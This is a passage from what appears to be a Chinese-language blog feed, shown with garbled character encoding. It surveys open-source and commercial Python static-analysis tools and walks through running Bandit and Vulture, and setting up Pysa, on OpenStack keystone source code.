><p>é»˜è®¤æ˜¯ç¬¬ä¸€è§†è§’çš„èµ°åŠ¨æ¨¡å¼ï¼Œå¯ä»¥å¼€å¯é£è¡Œæ¨¡å¼ï¼Œä»é£è¡Œæ¨¡å¼åˆ‡æ¢ä¸ºèµ°è·¯æ¨¡å¼ä¼šç›´æ¥è½åˆ°åœ°é¢ï¼›ä¸‹é¢ä¾æ¬¡æ˜¯å®¶å…·ç§»åŠ¨ã€æ—‹è½¬ã€å¤åˆ¶ã€æ’¤é”€ã€é‡åšã€åˆ é™¤ã€‚</p><img src="https://s2.loli.net/2022/02/09/GCnq652QyLdk3xl.jpg" ><p>å·¦ä¸‹çš„é€‰é¡¹éƒ½ç”¨äºé€‰æ‹©å®¶å…·ï¼Œåˆ†ç±»æ–¹å¼å’Œæ¸¸æˆå†…ã€<a href="https://cn.ff14housing.com/">æœ€ç»ˆå¹»æƒ³14 ä½å®…åŒº</a>éƒ½ä¸ä¸€æ ·ã€‚</p><img src="https://s2.loli.net/2022/02/09/ARJdctaZNPw93k1.jpg" ><p>X/Y/Z è½´å¯ä»¥æŒ‰ä½ç§»åŠ¨ï¼Œå³ä¾§é¢æ¿æŸ“è‰²å’Œè¾“å…¥åæ ‡ç§»åŠ¨ã€‚</p><img src="https://s2.loli.net/2022/02/10/lPgfBiRjUWcoatQ.jpg" ><p>æœ€åï¼ŒæŒ‰ <code>ESC</code> é€€å‡ºç¨‹åºã€‚</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>åˆšå¼€å§‹æ¢ç´¢ï¼Œæœ‰ä¸ªç›¸å…³æ’ä»¶ <a href="https://github.com/jawslouis/MakePlacePlugin">MakePlacePlugin</a> å¯ä»¥åœ¨æ¸¸æˆä¸­ä½¿ç”¨ï¼Œä¸è¿‡çœ‹èµ·æ¥åªæ”¯æŒå›½é™…æœã€‚</p><h1 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h1><ul><li><a href="https://jawslouis.itch.io/makeplace">MakePlace</a></li></ul>]]></content>
    
    
    <summary type="html">æœ¬åœ°è£…ä¿®æ¨¡æ‹Ÿå™¨</summary>
    
    
    
    <category term="Game" scheme="https://jckling.github.io/categories/Game/"/>
    
    
    <category term="FFXIV" scheme="https://jckling.github.io/tags/FFXIV/"/>
    
  </entry>
  
  <entry>
    <title>Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”</title>
    <link href="https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/"/>
    <id>https://jckling.github.io/2021/12/30/Security/Python%20%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%B0%83%E7%A0%94/</id>
    <published>2021-12-30T08:50:11.000Z</published>
    <updated>2022-03-08T09:03:12.294Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python-ç¨‹åºåˆ†æå·¥å…·è°ƒç ”"><a href="#Python-ç¨‹åºåˆ†æå·¥å…·è°ƒç ”" class="headerlink" title="Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”"></a>Python ç¨‹åºåˆ†æå·¥å…·è°ƒç ”</h2><p>Github ä¸Šçš„å¼€æºå·¥å…·ï¼Œ<code>*</code> å·è¡¨ç¤ºä»“åº“å·²ç»ä¸å†ç»´æŠ¤</p><table><thead><tr><th>å·¥å…·</th><th>æè¿°</th><th>å¼€å‘è¯­è¨€</th></tr></thead><tbody><tr><td><a href="https://github.com/yinwang0/pysonar2">PySonar2</a></td><td>è¯­ä¹‰ç´¢å¼•å™¨ï¼Œç”¨äºæ‰¹é‡å¤„ç†å¤§å‹ä»£ç åº“ã€‚ç‰ºç‰²å®æ—¶ç´¢å¼•èƒ½åŠ›ï¼Œä½¿ç”¨è¿‡ç¨‹é—´åˆ†ææ¥æ¨æ–­å˜é‡ã€å‚æ•°å’Œå‡½æ•°çš„ç±»å‹ã€‚ç›®å‰ä½œä¸ºå¤§å‹ä»£ç ç´¢å¼•æœåŠ¡çš„åŸºç¡€å¼•æ“ï¼ŒSourcegraph ä¸­ä¹Ÿæœ‰ä½¿ç”¨è¯¥å·¥å…·ã€‚</td><td>Java</td></tr><tr><td><a href="https://github.com/sourcegraph/sourcegraph">Sourcegraph </a></td><td>ä»£ç æœç´¢å’Œå¯¼èˆªå¼•æ“ï¼Œå¸®åŠ©é˜…è¯»å’Œç†è§£å¤§å‹é¡¹ç›®çš„ä»£ç ã€‚ç›®å‰æ”¯æŒ Goã€Javaã€Python ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œèƒ½å¤Ÿä»¥æµè§ˆå™¨æ’ä»¶çš„å½¢å¼æä¾›åœ¨çº¿ä»£ç é˜…è¯»çš„åŠŸèƒ½ã€‚</td><td>Goã€TypeScript</td></tr><tr><td><a href="https://github.com/coala/coala">coala</a></td><td>ä½¿ç”¨é…ç½®æ–‡ä»¶æ£€æµ‹å’Œä¿®å¤ä»£ç ï¼Œå¯è‡ªå®šä¹‰è§„åˆ™å’Œæ ‡å‡†æ£€æŸ¥ä»£ç è´¨é‡ï¼Œæ‰©å±•æ€§å¼ºã€‚æ”¯æŒ Pythonã€Javaã€C/C++ã€JavaScript ç­‰å¤šç§ç¼–ç¨‹è¯­è¨€ï¼Œæ”¯æŒä½œä¸ºç¼–è¾‘å™¨æ’ä»¶ä½¿ç”¨ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/nvdv/vprof">vprof</a></td><td>æ€§èƒ½åˆ†æå·¥å…·ï¼Œä¸º Python ç¨‹åºçš„è¿è¡Œæ—¶é—´ã€å†…å­˜ä½¿ç”¨æƒ…å†µç­‰æä¾›äº¤äº’å¼å¯è§†åŒ–ï¼Œä¸é€‚ç”¨äºå¤§å‹ä»£ç çš„åˆ†æã€‚</td><td>Pythonã€JavaScript</td></tr><tr><td><a href="https://github.com/scottrogowski/code2flow">Code2Flow</a></td><td>ä¸ºåŠ¨æ€è¯­è¨€ç”Ÿæˆç”Ÿæˆè°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼Œç›®å‰æ”¯æŒ Pythonã€JavaScriptã€Rubyã€PHPã€‚åŸºç¡€æµç¨‹ï¼š<code>AST -&gt; å‡½æ•°å®šä¹‰ -&gt; å‡½æ•°è°ƒç”¨ç‚¹ -&gt; è¿æ¥ç‚¹</code> ï¼Œä¸»è¦æ˜¯æä¾›ä¸€ä¸ªç²—ç•¥çš„æ¦‚è§ˆã€‚ç¼ºç‚¹æ˜¯æ²¡æœ‰å®šä¹‰çš„å‡½æ•°ã€ä¸åŒå‘½åç©ºé—´ç›¸åŒåå­—çš„å‡½æ•°å°†è¢«è·³è¿‡ç­‰ï¼Œå› æ­¤å¹¶ä¸é€‚ç”¨äºå¤§å‹ä»£ç çš„åˆ†æã€‚</td><td>Pythonã€JavaScript</td></tr><tr><td><a href="https://github.com/thebjorn/pydeps">pydeps</a></td><td>Python æ¨¡å—ä¾èµ–å¯è§†åŒ–ï¼Œå¯¼å‡º <code>.svg</code> æˆ– <code>.png</code> æ–‡ä»¶ã€‚åªè€ƒè™‘å¯¼å…¥çš„æ–‡ä»¶ï¼ˆæ¨¡å—å¿…é¡»å®‰è£…ï¼‰ï¼Œåœ¨ Python å­—èŠ‚ç ä¸­æŸ¥æ‰¾å¯¼å…¥æ“ä½œç ï¼ŒåŒæ—¶æ”¯æŒå¤–éƒ¨æ¨¡å—çš„åˆ†æã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/gak/pycallgraph">pycallgraph</a>*</td><td>ä¸º Python åº”ç”¨ç”Ÿæˆè°ƒç”¨å›¾ï¼ˆCall Graphï¼‰ï¼ŒåŒ…æ‹¬å‡½æ•°çš„è°ƒç”¨æ¬¡æ•°ã€æ‰§è¡Œæ—¶é—´ç­‰ä¿¡æ¯ï¼Œæä¾›ä¸€å®šç¨‹åº¦çš„æ€§èƒ½åˆ†æåŠŸèƒ½ã€‚åŒæ—¶æ”¯æŒè¿‡æ»¤å‡½æ•°ï¼Œé¿å…ç”Ÿæˆçš„å›¾å¤ªå¤§æ— æ³•åˆ†æï¼Œé»˜è®¤å¯¼å‡º <code>.png</code> æ–‡ä»¶ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/Yelp/undebt">undebt</a>*</td><td>æ‰§è¡Œå¤§è§„æ¨¡è‡ªåŠ¨åŒ–ä»£ç é‡æ„ï¼Œæ ¹æ®è‡ªå®šä¹‰æ¨¡å¼å¯¹ä»£ç è¿›è¡ŒæŸ¥æ‰¾å’Œæ›¿æ¢ï¼Œé€‚ç”¨äºä»»ä½•è¯­è¨€ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/python-security/pyt">pyt</a>*</td><td>åŸºäºç†è®ºåŸºç¡€çš„ Python Web åº”ç”¨é™æ€åˆ†æï¼ˆæ§åˆ¶æµå›¾ã€å®šç‚¹ã€æ•°æ®æµåˆ†æï¼‰ï¼Œèƒ½å¤Ÿæ£€æµ‹ SSRFã€SQL æ³¨å…¥ã€XSSã€ç›®å½•éå†ç­‰æ”»å‡»ï¼Œæ”¯æŒè‡ªå®šä¹‰æºç‚¹å’Œæ±‡ç‚¹ã€ä¼ æ’­æ±¡ç‚¹çš„å‡½æ•°ã€‚ç›®å‰å·²åœæ›´ï¼Œä½œè€…å»ºè®®ä½¿ç”¨ Pyre ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/facebook/pyre-check">Pyre (Facebook)</a></td><td>æ€§èƒ½ç±»å‹æ£€æŸ¥å™¨ï¼Œé›†æˆé™æ€åˆ†æå·¥å…· Pysaï¼ˆæ±¡ç‚¹åˆ†æï¼‰Pysa é€šè¿‡è·Ÿè¸ªæ•°æ®æµå®ç°å®‰å…¨æ£€æŸ¥ï¼Œä¾èµ–ç±»å‹æ³¨é‡Šï¼Œèƒ½å¤Ÿé«˜é€Ÿå¤„ç†å¤§å‹ä»£ç ã€‚</td><td>OCamlã€Python</td></tr><tr><td><a href="https://github.com/PyCQA/bandit">Bandit</a></td><td>æ„å»º AST å¹¶ä½¿ç”¨æ’ä»¶æ£€æŸ¥å®‰å…¨é—®é¢˜ï¼Œæœ€åˆåœ¨ OpenStack å®‰å…¨é¡¹ç›®ä¸­å¼€å‘ï¼Œåæ¥è¢«é‡æ–°å®šä½åˆ° PyCQAã€‚ä¸»è¦ç”¨äºæ‰«æå±é™©å‡½æ•°ï¼Œæ”¯æŒè‡ªå®šä¹‰æ¼æ´æµ‹è¯•å’Œæ‰©å±•æ’ä»¶ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/CoatiSoftware/Sourcetrail">Sourcetrail</a></td><td>è·¨å¹³å°çš„æºä»£ç æµè§ˆå™¨ï¼Œæ”¯æŒ C/C++ã€Javaã€Pythonï¼Œæä¾›æœç´¢ã€ä»£ç ã€å›¾å½¢ä¸‰ä¸ªäº¤äº’å¼è§†å›¾ã€‚äº®ç‚¹æ˜¯ç»™å‡ºäº†æºä»£ç çš„ç»“æ„ï¼Œä½†åªæœ‰ç¬¦å·åç§°ã€‚</td><td>C++ã€Java</td></tr><tr><td><a href="https://github.com/rubik/radon/">radon</a></td><td>è®¡ç®—æºä»£ç çš„åº¦é‡ï¼ˆmetricsï¼‰ï¼ŒåŒ…æ‹¬ McCabeã€Halsteadã€å¯ç»´æŠ¤æ€§ç´¢å¼•ä¸‰ç§åº¦é‡æŒ‡æ ‡ï¼Œæ”¯æŒåœ¨ coala ä¸­ä½¿ç”¨ã€‚ä¸»è¦ç”¨äºè¯„ä¼°ä»£ç çš„å¤æ‚åº¦ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/rubik/xenon">xenon</a></td><td>åŸºäº radon çš„ç›‘æµ‹å·¥å…·ï¼Œæ£€æŸ¥ä»£ç å¤æ‚æ€§ã€‚å¯åº”ç”¨äº CI/CDï¼Œåœ¨æ¯æ¬¡æäº¤ä»£ç æ—¶è¿è¡Œï¼Œæ ¹æ®è‡ªå®šä¹‰ä»£ç å¤æ‚æ€§é˜ˆå€¼è¿”å›æˆåŠŸæˆ–å¤±è´¥ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/davidhalter/jedi">jedi</a></td><td>Python é™æ€åˆ†æå·¥å…·ï¼Œä¾§é‡äºè‡ªåŠ¨è¡¥å…¨å’Œè·³è½¬ï¼Œé€šå¸¸ä½œä¸ºç¼–è¾‘å™¨çš„æ’ä»¶ä½¿ç”¨ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/python/mypy">mypy</a></td><td>é™æ€ç±»å‹æ£€æŸ¥å™¨ï¼ˆPEP 484ï¼‰ï¼Œèƒ½å¤Ÿå¯¹ Python ç¨‹åºä¸­çš„ç±»å‹æ³¨é‡Šæ‰§è¡Œé™æ€æ£€æŸ¥ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/Microsoft/pyright">pyright (Microsoft)</a></td><td>å¯ç”¨äºå¤§å‹ Python æºä»£ç åº“çš„å¿«é€Ÿç±»å‹æ£€æŸ¥å™¨ï¼Œä½¿ç”¨å†…ç½®çš„ç±»å‹å­˜æ ¹è¿›è¡Œç±»å‹æ¨æ–­ï¼Œå¯ä»¥åœ¨ç›‘è§†æ¨¡å¼ä¸‹è¿è¡Œï¼Œæ”¯æŒå¢é‡æ›´æ–°ã€‚</td><td>TypeScriptã€Python</td></tr><tr><td><a href="https://github.com/google/pytype">pytype (Google)</a></td><td>é™æ€åˆ†æå™¨ï¼Œæ— éœ€ç±»å‹æ³¨é‡Šå°±èƒ½æ£€æŸ¥å’Œæ¨æ–­ Python ä»£ç çš„ç±»å‹ï¼Œä¹Ÿåˆ©ç”¨äº†ç±»å‹å­˜æ ¹ï¼ˆpyi æ–‡ä»¶ï¼‰ã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/jendrikseipp/vulture">Vulture</a></td><td>æŸ¥æ‰¾ Python ç¨‹åºä¸­æœªä½¿ç”¨çš„ä»£ç ï¼ˆæ­»ä»£ç ï¼‰ï¼Œå­˜åœ¨æ¼æŠ¥ï¼Œå¹¶ä¸”éšå¼è°ƒç”¨å¯èƒ½ä¼šè¢«è¯¯æŠ¥ã€‚æ”¯æŒè®¾ç½®æœ€å°ç½®ä¿¡åº¦ã€ç™½åå•ç­‰åŠŸèƒ½ï¼Œå¯ä»¥å¯¹å•ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„ py æ–‡ä»¶æ‰§è¡Œåˆ†æã€‚</td><td>Python</td></tr><tr><td><a href="https://github.com/vitsalis/pycg">PyCG</a></td><td>ä½¿ç”¨é™æ€åˆ†æä¸º Python ä»£ç ç”Ÿæˆè°ƒç”¨å›¾ï¼Œæ”¯æŒé«˜é˜¶å‡½æ•°ã€ç±»ç»§æ‰¿ã€å¯¼å…¥çš„æ¨¡å—ã€åµŒå¥—å®šä¹‰ã€‚è¯¦è§è®ºæ–‡ <a href="https://vitsalis.com/papers/pycg.pdf">ICSE 2021 paper</a></td><td>Python</td></tr><tr><td><a href="https://github.com/tonybaloney/wily">Wily</a></td><td>å¤æ‚æ€§æ£€æŸ¥</td><td>Python</td></tr><tr><td><a href="https://github.com/PyCQA/mccabe">McCabe</a></td><td>å¤æ‚æ€§æ£€æŸ¥</td><td>Python</td></tr><tr><td><a href="https://github.com/thg-consulting/it">it</a></td><td>ä»£ç æ£€æŸ¥å·¥å…·/æ¡†æ¶</td><td>Python</td></tr></tbody></table><p>ä»¥åŠä¸€äº›é—­æºå·¥å…·</p><table><thead><tr><th>å·¥å…·</th><th></th></tr></thead><tbody><tr><td><a href="https://securitylab.github.com/tools/codeql/">CodeQL</a></td><td>ä»£ç åˆ†æå¼•æ“</td></tr><tr><td><a href="https://www.microfocus.com/en-us/cyberres/application-security/static-code-analyzer">Fortify SCA</a></td><td>é™æ€ä»£ç å®¡è®¡å·¥å…·</td></tr><tr><td><a href="https://marketplace.visualstudio.com/items?itemName=ms-python.vscode-pylance">Pylance (Microsoft)</a></td><td>åŸºäº pyright çš„ Python ä»£ç é™æ€åˆ†æå·¥å…·</td></tr><tr><td><a href="https://deepsource.io/">DeepSource</a></td><td>æ”¯æŒå¤šç§è¯­è¨€çš„é™æ€åˆ†æï¼Œä¸ªäººå…è´¹</td></tr><tr><td><a href="https://www.codacy.com/">Codacy</a></td><td>èƒ½å¤Ÿé€šè¿‡é™æ€ä»£ç åˆ†æè·å¾—å…³äºå®‰å…¨é—®é¢˜ã€ä»£ç è¦†ç›–ç‡ã€ä»£ç é‡å¤ç‡ã€ä»£ç å¤æ‚æ€§çš„ä¿¡æ¯</td></tr></tbody></table><p>å‰æ®µæ—¶é—´çš„ log4j è²Œä¼¼å°±æ˜¯ç”¨ CodeQL æ‰¾åˆ°çš„ğŸ‘</p><h2 id="Bandit"><a href="#Bandit" class="headerlink" title="Bandit"></a>Bandit</h2><p>Bandit å¯ä»¥ç”¨æ¥æœç´¢ Python ä»£ç ä¸­å¸¸è§çš„å®‰å…¨é—®é¢˜ï¼Œåœ¨æ£€æµ‹è¿‡ç¨‹ä¸­ï¼ŒBandit ä¼šå¯¹æ¯ä¸€ä»½ Python ä»£ç æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼ŒåŸºäº ast æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œç„¶åé’ˆå¯¹æ¯ä¸€ä¸ª AST èŠ‚ç‚¹è¿è¡Œç›¸åº”çš„æ£€æµ‹æ’ä»¶ã€‚å®Œæˆå®‰å…¨æ‰«æä¹‹åï¼ŒBandit ä¼šç›´æ¥ç»™ç”¨æˆ·ç”Ÿæˆæ£€æµ‹æŠ¥å‘Šã€‚</p><p>æ‹¿ keystone æºç è¿›è¡Œæµ‹è¯•ï¼Œæµ‹è¯•æ’ä»¶åˆ†ç»„å¦‚ä¸‹ï¼Œå¯ä»¥é€šè¿‡é…ç½®è¿›è¡Œé€‰æ‹©ï¼š</p><table><thead><tr><th>ID</th><th>Description</th></tr></thead><tbody><tr><td>B1xx</td><td>misc tests</td></tr><tr><td>B2xx</td><td>application/framework misconfiguration</td></tr><tr><td>B3xx</td><td>blacklists (calls)</td></tr><tr><td>B4xx</td><td>blacklists (imports)</td></tr><tr><td>B5xx</td><td>cryptography</td></tr><tr><td>B6xx</td><td>injection</td></tr><tr><td>B7xx</td><td>XSS</td></tr></tbody></table><h3 id="æµ‹è¯•-keystone"><a href="#æµ‹è¯•-keystone" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><p>ç¯å¢ƒå‡†å¤‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># virtualenv</span></span><br><span class="line">sudo apt install python3-virtualenv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">virtualenv bandit-env</span><br><span class="line">python3 -m venv bandit-env</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> bandit-env/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Bandit</span></span><br><span class="line">pip install bandit</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæµ‹è¯•ç›®å½•</span></span><br><span class="line">mkdir bandit-test &amp;&amp; <span class="built_in">cd</span> bandit-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ keystone æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br></pre></td></tr></table></figure><p>ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯é»‘åå•å’Œè‡ªå®šä¹‰æ£€æµ‹è§„åˆ™ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿è¡Œ Bandit</span></span><br><span class="line">bandit -r keystone -o test.txt -f txt</span><br><span class="line">bandit -r keystone -o test.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶åˆ°æœ¬åœ°æŸ¥çœ‹</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/test.html /c/Users/linki/Desktop</span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½®æ–‡ä»¶</span></span><br><span class="line">.bandit</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„æ–‡ä»¶ <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/test.html">test.html</a> æ˜¾ç¤ºæ‰«æäº† 118379 è¡Œä»£ç ï¼Œè“è‰²è¡¨ç¤ºä½å±ï¼Œæ©™è‰²è¡¨ç¤ºä¸­å±ï¼Œè¿™é‡Œæ‰€æœ‰çš„éƒ½åªå‡ºç°åœ¨ tests çš„æµ‹è¯•æ–‡ä»¶ä¸­ã€‚</p><p>è¿‡æ»¤æµ‹è¯•æ–‡ä»¶å¤¹ï¼Œé‡æ–°æ‰§è¡Œæ£€æµ‹ï¼Œå¾—åˆ° html æ–‡ä»¶ï¼š<a href="https://raw.githubusercontent.com/jckling/Assets/master/python/testx.html">testx.html</a> æ˜¾ç¤ºæ‰«æ 41415 è¡Œä»£ç ï¼Œæ²¡æœ‰ç”¨åˆ°å±é™©å‡½æ•°ã€‚</p><p>Bandit åŸå…ˆæ˜¯ OpenStack çš„é¡¹ç›®ï¼Œéƒ¨åˆ†ç»„ä»¶çš„å¼€å‘æœ‰ä½¿ç”¨ Bandit è¿›è¡Œæ£€æŸ¥ï¼Œå…¶ä¸­å°±åŒ…æ‹¬ keystone ï¼Œå› æ­¤ç”¨ Bandit æ‰«æç»„ä»¶çš„æ„ä¹‰å¯èƒ½ä¸æ˜¯å¾ˆå¤§ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿‡æ»¤æµ‹è¯•æ–‡ä»¶å¤¹</span></span><br><span class="line">bandit -r keystone/keystone/ --exclude keystone/keystone/tests/ -o testx.html -f html</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤åˆ¶åˆ°æœ¬åœ°æŸ¥çœ‹</span></span><br><span class="line">scp -r jck@10.123.123.123:~/bandit-test/testx.html /c/Users/linki/Desktop</span><br></pre></td></tr></table></figure><h2 id="Vulture"><a href="#Vulture" class="headerlink" title="Vulture"></a>Vulture</h2><p>åŒæ ·åˆ©ç”¨äº† ast æ¨¡å—ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼Œåœ¨éå†æ—¶è®°å½•å·²å®šä¹‰å’Œä½¿ç”¨çš„å¯¹è±¡åç§°ï¼Œæœ€åæŠ¥å‘Šæœªä½¿ç”¨çš„å¯¹è±¡ï¼ˆæ­»ä»£ç ï¼‰ã€‚è¿˜é€šè¿‡æŸ¥æ‰¾ returnã€breakã€continueã€raiseã€ä¸æ»¡è¶³æ¡ä»¶çš„ if æ¡ä»¶ã€while æ¡ä»¶æ¥æ£€æµ‹ä¸å¯è¾¾çš„ä»£ç ã€‚å› ä¸ºåªè€ƒè™‘å¯¹è±¡åç§°ï¼Œæ²¡æœ‰è€ƒè™‘ä½œç”¨åŸŸï¼Œå› æ­¤å¯èƒ½å­˜åœ¨æ¼æŠ¥ï¼Œè€Œä¸”éšå¼è°ƒç”¨å¯èƒ½ä¼šè¢«è¯¯æŠ¥ã€‚</p><h3 id="æµ‹è¯•-keystone-1"><a href="#æµ‹è¯•-keystone-1" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><p>å…·ä½“çš„å®‰è£…ä¸æµ‹è¯•æ“ä½œå¦‚ä¸‹ï¼Œæ‰§è¡Œç»“æœå¯¼å‡ºä¸º <a href="https://raw.githubusercontent.com/jckling/Assets/master/python/unused.txt">unused.txt</a>ï¼Œæœ€åç»™å‡ºäº†ç½®ä¿¡åº¦ã€‚æ‰§è¡Œé€Ÿåº¦éå¸¸å¿«ï¼Œä½†ç»™å‡ºçš„ç»“æœä¿¡æ¯é‡å°‘ï¼Œåªèƒ½ä½œä¸ºç®€å•çš„å‚è€ƒã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">mkdir vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">python -m venv vulture-test</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">cd</span> vulture-test</span><br><span class="line"><span class="built_in">source</span> bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Vulture</span></span><br><span class="line">pip install vulture</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹è½½ keystone æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --single-branch --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œåˆ†æ</span></span><br><span class="line">vulture keystone/keystone/ --exclude keystone/keystone/tests/ --sort-by-size &gt; unused.txt</span><br></pre></td></tr></table></figure><h2 id="Pysa"><a href="#Pysa" class="headerlink" title="Pysa"></a>Pysa</h2><p>å…¥é—¨æ•™ç¨‹å¯ä»¥çœ‹ï¼š<a href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/">Pyre æ±¡ç‚¹åˆ†æå·¥å…· Pysa ä½¿ç”¨æ•™ç¨‹</a></p><h3 id="æµ‹è¯•-keystone-2"><a href="#æµ‹è¯•-keystone-2" class="headerlink" title="æµ‹è¯• keystone"></a>æµ‹è¯• keystone</h3><h4 id="ç¯å¢ƒå‡†å¤‡"><a href="#ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¯å¢ƒå‡†å¤‡"></a>ç¯å¢ƒå‡†å¤‡</h4><p>å®‰è£…ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ›´æ–° Python3.8.x</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install python3.8 python3.8-venv python3.8-dev python3-pip -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># update-alternatives é…ç½® python æŒ‡å‘ python3.8.x å</span></span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line">pip install wheel</span><br></pre></td></tr></table></figure><p>åˆå§‹é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">python -m venv ~/.venvs/pysa</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line"><span class="built_in">source</span> ~/.venvs/pysa/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›´æ–°å·¥å…·</span></span><br><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Pyre å’Œ SAPP</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><h4 id="åˆ†æ-keystone-æºç "><a href="#åˆ†æ-keystone-æºç " class="headerlink" title="åˆ†æ keystone æºç "></a>åˆ†æ keystone æºç </h4><p>ä¸‹è½½ Victoria ç‰ˆæœ¬çš„ keystone æºç å¹¶å®‰è£…ä¾èµ–ï¼Œèƒ½å¤Ÿè®© Pysa 